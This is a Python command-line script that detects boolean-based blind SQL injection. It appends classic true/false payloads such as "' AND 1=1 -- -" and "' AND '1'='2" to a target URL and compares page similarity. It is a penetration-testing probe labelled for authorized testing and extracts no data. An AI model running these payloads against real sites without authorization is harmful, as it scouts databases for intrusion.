#!/usr/bin/env python3
import requests
import argparse
from difflib import SequenceMatcher

class SQLInjection:
    # How similar two pages must be (0..1) to count as "the same".
    SIMILARITY_THRESHOLD = 0.95

    def __init__(self, url, true_payload, false_payload):
        self.url = url
        self.true_payload = true_payload
        self.false_payload = false_payload
        self.baseline_text = None

    def _similarity(self, a, b):
        return SequenceMatcher(None, a, b).ratio()

    def get_baseline(self):
        if self.baseline_text is None:
            self.baseline_text = requests.get(self.url).text
            print(f"[+] Baseline URL size: {len(self.baseline_text)}...")
        return self.baseline_text

    def sqli_test(self):
        baseline = self.get_baseline()
        true_text = requests.get(self.url + self.true_payload).text
        false_text = requests.get(self.url + self.false_payload).text

        true_vs_baseline = self._similarity(true_text, baseline)
        false_vs_baseline = self._similarity(false_text, baseline)
        true_vs_false = self._similarity(true_text, false_text)

        print(f"    true~baseline={true_vs_baseline:.3f} "
              f"false~baseline={false_vs_baseline:.3f} "
              f"true~false={true_vs_false:.3f}")

        # TRUE should look like the baseline; FALSE should not;
        # and TRUE and FALSE must clearly differ from each other.
        if (true_vs_baseline >= self.SIMILARITY_THRESHOLD
                and false_vs_baseline < self.SIMILARITY_THRESHOLD
                and true_vs_false < self.SIMILARITY_THRESHOLD):
            print(f"[+] SQLi confirmed! true={self.true_payload!r} "
                  f"false={self.false_payload!r}")
            return True

        print("[-] SQLi not confirmed for this pair...")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="Boolean-based blind SQLi detector (authorized testing only)")
    parser.add_argument("url", help="URL to test")
    args = parser.parse_args()

    TRUE_PAYLOADS = ["' AND 1=1 -- -", " AND 1=1--", "' AND 'a'='a"]
    FALSE_PAYLOADS = ["' AND '1'='2", " AND 1=2--", "' AND 'a'='b"]

    for true_payload in TRUE_PAYLOADS:
        for false_payload in FALSE_PAYLOADS:
            sqli = SQLInjection(args.url, true_payload, false_payload)
            if sqli.sqli_test():
                return
    print("[-] No payload pair confirmed SQLi.")


if __name__ == "__main__":
    main()
